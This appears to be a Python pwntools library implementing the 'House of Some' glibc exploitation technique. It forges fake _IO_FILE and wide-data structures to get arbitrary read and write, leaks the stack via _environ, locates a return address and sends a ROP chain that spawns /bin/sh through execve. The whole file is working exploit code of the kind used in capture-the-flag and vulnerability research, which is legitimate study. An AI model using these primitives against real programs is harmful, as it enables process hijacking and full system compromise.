"""
By Csome, enllus1on
ref: https://github.com/CsomePro/House-of-Some
ref: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more
"""

from pwn import *
# context.arch = "amd64"

class HouseOfSome:

    def __init__(self, libc: ELF, controled_addr, zero_addr=0):
        self.libc = libc
        self.controled_addr =controled_addr
        self.READ_LENGTH_DEFAULT = 0x400
        self.LEAK_LENGTH = 0x500
        self.zero_addr = zero_addr
        if self.zero_addr == 0:
            self.zero_addr = self.libc.symbols['_environ'] - 0x10

        self.fake_wide_data_template = lambda : flat({
            0x18: 0,
            0x20: 1,
            0x30: 0,
            0xE0: self.libc.symbols['_IO_file_jumps'] - 0x48,
        }, filler=b"\x00")

        self.fake_file_read_template = lambda buf_start, buf_end, wide_data, chain, fileno: flat({
            0x00: 0, # _flags
            0x20: 0, # _IO_write_base
            0x28: 0, # _IO_write_ptr
            
            0x38: buf_start, # _IO_buf_base
            0x40: buf_end, # _IO_buf_end
            
            0x70: p32(fileno), # _fileno
            0x82: b"\x00", # _vtable_offset
            0x88: self.zero_addr,
            0xc0: 2, # _mode
            0xa0: wide_data, # _wide_data
            0x68: chain, # _chain
            0xd8: self.libc.symbols['_IO_wfile_jumps'], # vtable
        }, filler=b"\x00")

        self.fake_file_write_template = lambda buf_start, buf_end, chain, fileno: flat({
            0x00: 0x800 | 0x1000 | 0x8000, # _flags
            
            0x20: buf_start, # _IO_write_base
            0x28: buf_end, # _IO_write_ptr

            0x70: p32(fileno), # _fileno
            0x68: chain, # _chain
            # 0x88: self.zero_addr,
            0xd8: self.libc.symbols['_IO_file_jumps'], # vtable
        }, filler=b"\x00")

        # ref: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more
        self.hoi_read_file_template = lambda read_addr, len, _chain, _fileno: fit({
            0x00: 0x8000 | 0x40 | 0x1000, #_flags
            0x20: read_addr, #_IO_write_base
            0x28: read_addr + len, #_IO_write_ptr
            0x68: _chain, #_chain
            0x70: p32(_fileno), # _fileno
            0xc0: 0, #_modes
            0xd8: self.libc.sym["_IO_file_jumps"] - 0x8, #_vtable
        }, filler=b'\x00')

        self.wide_data_length = len(self.fake_wide_data_template())
        self.read_file_length = len(self.fake_file_read_template(0, 0, 0, 0, 0))
        self.write_file_length = len(self.fake_file_write_template(0, 0, 0, 0))
        self.hoi_read_file_length = len(self.hoi_read_file_template(0, 0, 0, 0))

        self.panel = max(self.hoi_read_file_length * 2, self.write_file_length + self.hoi_read_file_length)
        self.switch = 0
        self.addr_panel = [self.controled_addr, self.controled_addr+self.panel]

    def _next_control_addr(self, addr, len):
        # return addr + len
        """
        内存复用，仅仅使用self.panel * 2内存即可，防止多次RE后溢出
        """
        if len <= self.panel:
            self.switch = 1 - self.switch
            return self.addr_panel[self.switch]
        return self.addr_panel[0] + self.panel * 2
    
    def read(self, fd, buf, len, end=0):
        addr = self.controled_addr
        f_read_file_0 = self.hoi_read_file_template(buf, len, addr+self.hoi_read_file_length, fd) 
        # f_wide_data = self.fake_wide_data_template()
        addr += self.hoi_read_file_length
        self.controled_addr = self._next_control_addr(self.controled_addr, self.hoi_read_file_length * 2)
        f_read_file_1 = self.hoi_read_file_template(self.controled_addr, 
                                                     self.READ_LENGTH_DEFAULT, 
                                                     0 if end else self.controled_addr, 
                                                     0) 
        
        payload = flat([
            f_read_file_0,
            f_read_file_1,
        ])
        assert b"\n" not in payload, "\\n in payload."
        return payload
    
    def write(self, fd, buf, len):
        addr = self.controled_addr
        f_write_file = self.fake_file_write_template(buf, buf+len, addr+self.write_file_length, fd) 
        addr += self.write_file_length
        self.controled_addr = self._next_control_addr(self.controled_addr, self.hoi_read_file_length + self.write_file_length)
        f_read_file_1 = self.hoi_read_file_template(self.controled_addr, self.READ_LENGTH_DEFAULT, self.controled_addr, 0) 
        
        payload = flat([
            f_write_file,
            f_read_file_1,
        ])
        
        assert b"\n" not in payload, "\\n in payload."
        return payload
    
    def bomb(self, io: tube, retn_addr):

        stack = self.bomb_raw(io, retn_addr)

        rop = ROP(self.libc)
        rop.base = stack
        rop.call('execve', [b'/bin/sh', 0, 0])
        log.info(rop.dump())
        rop_chain = rop.chain()
        assert b"\n" not in rop_chain, "\\n in rop_chain"
        io.sendline(rop_chain)

    def bomb_raw(self, io: tube, retn_addr):
        payload = self.write(1, self.libc.symbols['_environ'], 0x8)
        io.sendline(payload)
        stack_leak = u64(io.recv(8).ljust(8, b"\x00"))
        log.success(f"stack_leak : {stack_leak:#x}")

        payload = self.write(1, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)
        io.sendline(payload)
        # retn_addr = self.libc.symbols['_IO_file_underflow'] + 390
        log.success(f"retn_addr : {retn_addr:#x}")
        buf = io.recv(self.LEAK_LENGTH)
        offset = buf.find(p64(retn_addr))
        log.success(f"offset : {offset:#x}")

        assert offset > 0, f"offset not find"

        payload = self.read(0, stack_leak - self.LEAK_LENGTH + offset, 0x300, end=1)
        io.sendline(payload)

        return stack_leak - self.LEAK_LENGTH + offset
